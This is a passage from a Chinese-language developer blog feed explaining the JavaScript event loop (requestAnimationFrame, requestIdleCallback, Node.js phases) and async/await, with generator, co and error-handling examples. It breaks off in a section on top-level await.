次，但这会根据浏览器和设备的性能而变化。使用 <code>requestAnimationFrame()</code> 可以保证动画的流畅性，因为它是在浏览器准备好绘制新帧时执行。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 requestAnimationFrame 请求动画帧</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">updateAnimation</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 更新动画的代码</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="title function_">requestAnimationFrame</span>(updateAnimation);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开始动画</span></span><br><span class="line"><span class="title function_">requestAnimationFrame</span>(updateAnimation);</span><br></pre></td></tr></table></figure><p>我之后准备出一些关于前端动效实现的文章，到时候细说这个 API，现在先给一个尽可能简单的示范。</p><h3 id="requestIdleCallback"><a href="#requestIdleCallback" class="headerlink" title="requestIdleCallback()"></a><strong>requestIdleCallback()</strong></h3><p><code>requestIdleCallback()</code> 用于在主线程空闲时执行低优先级的任务，当事件循环空闲，并且没有其他脚本或渲染任务需要执行时，浏览器会调用通过 <code>requestIdleCallback()</code> 注册的回调函数。这个 API 的目的是在不影响性能和响应性的情况下，利用空闲时间执行后台和低优先级的工作，回调函数会接收一个 <code>IdleDeadline</code> 对象，提供了一个 <code>timeRemaining()</code> 方法，该方法可以告诉你当前帧中剩余多少时间可以用于执行代码。</p><p>举一个相对贴近实际的例子，即如何在一个假想的大型电商网站中使用 <strong><code>requestIdleCallback()</code></strong> 来优化图片懒加载功能：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设有一个函数用于懒加载图片</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">lazyLoadImages</span>(<span class="params">images</span>) &#123;</span><br><span class="line">  images.<span class="title function_">forEach</span>(<span class="function"><span class="params">image</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isInViewport</span>(image)) &#123;</span><br><span class="line">      <span class="title function_">loadImage</span>(image);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 requestIdleCallback 来调度懒加载任务</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">scheduleLazyLoad</span>(<span class="params">images</span>) &#123;</span><br><span class="line">  <span class="comment">// 如果浏览器支持 requestIdleCallback，则使用它</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="string">&#x27;requestIdleCallback&#x27;</span> <span class="keyword">in</span> <span class="variable language_">window</span>) &#123;</span><br><span class="line">    <span class="title function_">requestIdleCallback</span>(<span class="function"><span class="params">deadline</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">while</span> (deadline.<span class="title function_">timeRemaining</span>() &gt; <span class="number">0</span> &amp;&amp; images.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="title function_">lazyLoadImages</span>(images.<span class="title function_">splice</span>(<span class="number">0</span>, <span class="number">2</span>)); <span class="comment">// 每次处理两个图片</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果还有图片未处理，继续调度</span></span><br><span class="line">      <span class="keyword">if</span> (images.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="title function_">scheduleLazyLoad</span>(images);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果浏览器不支持 requestIdleCallback，则回退到 setTimeout</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="title function_">lazyLoadImages</span>(images), <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设页面上有很多图片需要懒加载</span></span><br><span class="line"><span class="keyword">const</span> allImages = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.lazy-load-image&#x27;</span>);</span><br><span class="line"><span class="title function_">scheduleLazyLoad</span>(<span class="title class_">Array</span>.<span class="title function_">from</span>(allImages));</span><br></pre></td></tr></table></figure><p>在这个示例中，<code>scheduleLazyLoad</code> 函数使用 <code>requestIdleCallback</code> 来安排图片的懒加载。它会检查浏览器是否支持 <code>requestIdleCallback</code>，如果支持，就使用它来在浏览器空闲时加载图片。每次回调函数被调用时，它会处理一小批图片，确保不会占用太多的主线程时间，从而不影响用户的交互体验。</p><p>如果浏览器不支持 <code>requestIdleCallback</code>，则使用 <code>setTimeout</code> 作为回退方案。这样可以确保在所有浏览器中都能实现懒加载功能，同时在支持的浏览器中提供更好的性能。</p><h2 id="Node-js-中的事件循环"><a href="#Node-js-中的事件循环" class="headerlink" title="Node.js 中的事件循环"></a>Node.js 中的事件循环</h2><p>虽然用的都是 V8 引擎（暂且这么说），但因为使用场景和任务的不同，Node.js 的事件循环与浏览器中 JavaScript 原生的事件循环存在差异。</p><p>从整体上来看，最显著的差异就是 Node.js 的事件循环分阶段，每个阶段都有一个 FIFO 队列，只有当队列的事件执行完或达到该阶段的上限时，才会进入下一个阶段。Node.js 会在每次事件循环之间检查是否在等待任何 I&#x2F;O 或定时器，如果没有，则程序关闭退出，一次完整的 Node.js 事件循环包括以下几个阶段：</p><ul><li><strong>timers 阶段</strong>: 执行 <code>setTimeout()</code> 和 <code>setInterval()</code> 定时器的回调函数。</li><li><strong>pending callbacks 阶段</strong>: 执行延迟到下一个循环迭代的 I&#x2F;O 回调。</li><li><strong>idle, prepare 阶段</strong>: 仅系统内部使用。</li><li><strong>poll 阶段</strong>: 检索新的 I&#x2F;O 事件; 执行与 I&#x2F;O 相关的回调，几乎所有的异步操作都在这个阶段处理。</li><li><strong>check 阶段</strong>: <code>setImmediate()</code> 的回调在这里执行。</li><li><strong>close callbacks 阶段</strong>: 执行一些关闭的回调函数，如 <code>socket.on(&#39;close&#39;, ...)</code>。</li></ul><p>其中的 poll 阶段需要注意，如果 poll 队列执行完没有<code>setImmediate</code>但是有定时器到期，就会绕回去执行 timers 阶段。</p><p><img src="https://img.ma5hr00m.top/blog/20240610160523.png" alt="20240610160523"></p><h2 id="阅读文章"><a href="#阅读文章" class="headerlink" title="阅读文章"></a>阅读文章</h2><ul><li><a href="https://www.explainthis.io/zh-hant/swe/what-is-event-loop">請說明瀏覽器中的事件循環 (Event Loop)｜ExplainThis</a></li><li><a href="https://dennisgo.cn/Articles/JavaScript/AsyncAndEventLoop.html">异步和EventLoop · 前端进阶</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> Browser </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流畅地使用 async/await</title>
      <link href="/2024/06/03/2024/async-await/"/>
      <url>/2024/06/03/2024/async-await/</url>
      
        <content type="html"><![CDATA[<p><code>async/await</code> 是 JavaScript 用来处理异步操作的语法。它们建立在 Promise 的基础上，提供了一种简洁直观的方式来编写和管理异步代码，现在也已经成为了 JavaScript 实际上的最佳异步编程方案。</p><h2 id="Generator"><a href="#Generator" class="headerlink" title="Generator"></a>Generator</h2><p><code>async</code> 实质上就是早期的 <code>generator</code> 函数的语法糖。</p><p>JavaScript 中的生成器（Generator）函数是 ES6 引入（与 Promise 一起）的一种特殊类型的函数。生成器这个概念最初来自于其他编程语言，如 Python，把这东西引入到 JavaScript 中，主要是为了简化异步编程和迭代操作。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><code>generator</code> 函数的本质是一种可以暂停执行和恢复执行的函数，它返回一个遵循迭代器协议的生成器对象（即 <code>Iterator</code> 对象）。这个对象通过 <code>next()</code> 方法进行迭代，每次调用 <code>next()</code> 都会执行到下一个 <code>yield</code> 表达式，并返回一个包含 <code>value</code> 和 <code>done</code> 属性的对象，其中 <code>value</code> 表示返回的值，<code>done</code> 表示是否完成所有迭代。</p><p><code>yield</code> ****表达式是暂停、恢复执行的关键。在生成器函数体内，使用 <code>yield</code> 表达式来暂停函数的执行，并返回一个值到生成器外部。当外部代码再次调用生成器的 <code>next()</code> 方法时，生成器函数会从上次暂停的地方继续执行。</p><p>语法也比较简单，可以看看以下示范：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>* <span class="title function_">numberGen3erator</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">yield</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">yield</span> <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">yield</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> gen = <span class="title function_">numberGenerator</span>(); <span class="comment">// 调用生成器函数创建生成器对象</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(gen.<span class="title function_">next</span>().<span class="property">value</span>); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(gen.<span class="title function_">next</span>().<span class="property">value</span>); <span class="comment">// 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(gen.<span class="title function_">next</span>().<span class="property">value</span>); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><p>看到这语法结构，你可能会感到熟悉，稍后再说。</p><h3 id="co"><a href="#co" class="headerlink" title="co"></a>co</h3><p>既然介绍 <code>generator</code> 和 <code>async</code> 的关系，那就要说到 <code>co</code>。</p><p><code>co</code> 库是一个用于 Node.js 和浏览器的 JavaScript 库，由 TJ Holowaychuk 开发。它基于 <code>generator</code> 来控制异步流程，允许开发者以一种看起来几乎像同步代码的方式来编写非阻塞的异步代码。<code>co</code> 库的核心功能是自动执行生成器函数，处理 <code>yield</code> 关键字后面跟随的任何 <code>Promise</code> 对象，并在 <code>Promise</code> 解决后继续执行生成器函数。</p><ul><li><strong><code>co</code></strong> 库可以将生成器函数转换为返回 <strong><code>Promise</code></strong> 对象的函数。</li><li>它支持 <strong><code>yield</code></strong> 关键字后面跟随的 <strong><code>Promise</code></strong> 对象、Thunk 函数、数组（并行执行）、对象（并行执行）、生成器和生成器函数（委托）。</li><li><strong><code>co</code></strong> 库的使用前提是生成器函数的 <strong><code>yield</code></strong> 命令后面只能是 Thunk 函数或 <strong><code>Promise</code></strong> 对象。</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> co = <span class="built_in">require</span>(<span class="string">&#x27;co&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">co</span>(<span class="keyword">function</span>* () &#123;</span><br><span class="line">  <span class="keyword">var</span> result = <span class="keyword">yield</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value); <span class="comment">// true</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在这个示例中，<code>co</code> 函数接受一个 <code>generator</code> 作为参数，并返回一个 <code>Promise</code> 对象。生成器函数内部通过 <code>yield</code> 暂停执行，等待 <code>Promise</code> 解决，然后 <code>co</code> 库会自动恢复执行。</p><h3 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h3><p>有了前面的铺垫，这里做个对比：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// async/await</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchData</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;some-url&#x27;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// generator + co</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fetchData</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">co</span>(<span class="keyword">function</span>* () &#123;</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">yield</span> <span class="title function_">fetch</span>(<span class="string">&#x27;some-url&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一目了然，在语法结构层面，你只需要去除 <code>co</code>，然后将 <code>*</code> 替换为 <code>async</code>，<code>yield</code> 替换为 <code>await</code> 即可。既然 <code>async</code> 是对 <code>generator</code> 的封装，那肯定做了一些优化，主要体现在以下四点：</p><ol><li>内置执行器，无需使用额外的 <code>co</code> 库，也不需要手动指定 <code>.next()</code>；</li><li>语义性好，代码更简洁；</li><li>适用性广泛，<code>await</code>命令后面，可以是 Promise 对象和原始类型的值，没有了 <code>yield</code> 的限制；</li><li>返回值为 Promise，可以使用 <code>.then</code> 等语法，更方便。</li></ol><blockquote><p><code>async</code> 函数完全可以看作多个异步操作，包装成的一个 Promise 对象，而 <code>await</code> 命令就是内部 <code>then</code> 命令的语法糖。</p></blockquote><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="async-语法"><a href="#async-语法" class="headerlink" title="async 语法"></a>async 语法</h3><p>使用 <code>async</code> 关键字可以声明一个异步函数（async function），这种函数会返回一个 <code>Promise</code> 对象。如果函数体内有返回值，那么这个值会被 <code>Promise.resolve()</code> 包装。如果函数抛出错误，则会被 <code>Promise.reject()</code> 包装。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>().<span class="title function_">then</span>(alert); <span class="comment">// &quot;Hello, World!&quot;</span></span><br></pre></td></tr></table></figure><h3 id="await-语法"><a href="#await-语法" class="headerlink" title="await 语法"></a>await 语法</h3><p><code>await</code> 关键字用于等待一个 <code>Promise</code> 完成（fulfilled）或拒绝（rejected）。它只能在异步函数内部使用。当 <code>await</code> 表达式暂停执行异步函数时，它会等待 <code>Promise</code> 解决，然后恢复异步函数的执行并返回解决的值。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">f3</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="title function_">resolve</span>(<span class="string">&quot;完成!&quot;</span>), <span class="number">1000</span>)</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> result = <span class="keyword">await</span> promise; <span class="comment">// 等待直到 promise 解决 (*)</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_">alert</span>(result); <span class="comment">// &quot;完成!&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><p><code>async</code> 异步编程错误处理的姿势比较多，比较推荐的是老老实实使用 <code>try...catch...</code>，虽然这可能造成有些情况下难以找到具体错误代码（比如 <code>await</code> 被嵌套在其他操作中）。</p><p>另一种方案是在 <code>await</code> 之后使用 <code>catch()</code> 块捕获错误，也可以，但会造成代码风格上的冲突。</p><p>此外，还有一种有趣的 Golang 代码风格的错误处理方式。我们可以通过创建一个包装函数来模拟这种行为，这个函数接受一个 <strong><code>Promise</code></strong> 并返回一个包含两个值的数组：一个错误和一个结果，这样我们就可以使用数组解构来同时获取错误和结果，而不需要使用 <strong><code>try...catch...</code></strong> 块。这种方法使得错误处理更加显式。</p><p>下面是一个实现这种错误处理的示范：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x27;to&#x27; 函数用于转换 Promise，以便它返回一个包含错误和结果的数组</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">to</span>(<span class="params">promise</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> promise</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> [<span class="literal">null</span>, data])</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> [err]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 异步函数使用 &#x27;to&#x27; 函数和 &#x27;await&#x27; 来处理 fetch 请求</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchUrl</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [err, response] = <span class="keyword">await</span> <span class="title function_">to</span>(<span class="title function_">fetch</span>(url));</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Fetch error:&#x27;</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> [parseErr, data] = <span class="keyword">await</span> <span class="title function_">to</span>(response.<span class="title function_">json</span>());</span><br><span class="line">  <span class="keyword">if</span> (parseErr) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;JSON parsing error:&#x27;</span>, parseErr);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Fetched data:&#x27;</span>, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="示范"><a href="#示范" class="headerlink" title="示范"></a>示范</h3><p>模拟用户登录流程，流程看注释：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设我们有一个用于请求用户数据的函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getUser</span>(<span class="params">username</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (username === <span class="string">&#x27;Alice&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(&#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">username</span>: <span class="string">&#x27;Alice&#x27;</span>, <span class="attr">verified</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;用户不存在&#x27;</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设我们有另一个函数用于验证用户</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">verifyUser</span>(<span class="params">user</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (user.<span class="property">verified</span>) &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(<span class="string">&#x27;用户验证成功&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;用户验证失败&#x27;</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 async/await 和 .then().catch() 结合处理登录流程</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">loginUser</span>(<span class="params">username</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 使用 await 等待 getUser 函数解决</span></span><br><span class="line">    <span class="keyword">const</span> user = <span class="keyword">await</span> <span class="title function_">getUser</span>(username);</span><br><span class="line">    <span class="comment">// 使用 await 等待 verifyUser 函数解决</span></span><br><span class="line">    <span class="keyword">const</span> verificationStatus = <span class="keyword">await</span> <span class="title function_">verifyUser</span>(user);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(verificationStatus);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="comment">// 处理任何在 getUser 或 verifyUser 中抛出的错误</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(error.<span class="property">message</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 loginUser 函数，并使用 .then().catch() 处理最终结果</span></span><br><span class="line"><span class="title function_">loginUser</span>(<span class="string">&#x27;Alice&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;登录流程完成&#x27;</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;登录流程中发生错误:&#x27;</span>, error.<span class="property">message</span>);</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><p>实际处理异步操作就套用这个 combo。此外还有一些使用时的注意点，这里也做补充：</p><ol><li>多个 <code>await</code> 之间如果不存在继发关系，用 <code>Promise.all()</code> 统一处理，避免额外耗时；</li><li><code>async</code> 函数保留运行栈。</li></ol><p>最后一条特性需要个小例子来解释：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// b() 执行时 a() 同步执行，若 b() or c() 报错，错误堆栈可能不包括 a()</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">a</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="title function_">b</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> <span class="title function_">c</span>());</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// b() 执行时 a() 暂停执行，上下文保留，b() or c() 报错，错误堆栈一定包括 a()</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">a</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">b</span>();</span><br><span class="line">  <span class="title function_">c</span>();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="实例：顺序完成异步加载"><a href="#实例：顺序完成异步加载" class="headerlink" title="实例：顺序完成异步加载"></a>实例：顺序完成异步加载</h3><p><code>async</code> 内部的多个 <code>await</code> 使继发执行的，如果这些异步操作没有相互依赖，这种特性会降低运行效率，所以我们可以使用以下代码并发发出请求，然后顺序获得结果：</p><blockquote><p>代码案例来自阅读文档1</p></blockquote><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">logInOrder</span>(<span class="params">urls</span>) &#123;</span><br><span class="line">  <span class="comment">// 并发读取远程URL</span></span><br><span class="line">  <span class="keyword">const</span> textPromises = urls.<span class="title function_">map</span>(<span class="keyword">async</span> url =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url);</span><br><span class="line">    <span class="keyword">return</span> response.<span class="title function_">text</span>();</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 按次序输出</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> textPromise <span class="keyword">of</span> textPromises) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">await</span> textPromise);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="顶层-await"><a href="#顶层-await" class="headerlink" title="顶层 await"></a>顶层 await</h2><p>除了在 <code>async</code> 代码块中，我们也可以在模块的顶层代码中使用 <strong><code>await</code></strong> 关键字。</p><p>当模块需要在执行任何其他代码之前完成某些异步操作，如数据加载、资源配置等，或者当一个模块依赖于另一个异步解析的模块时，可以使用顶层 <strong><code>await</code></strong> 确保所有依赖都已正确加载。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 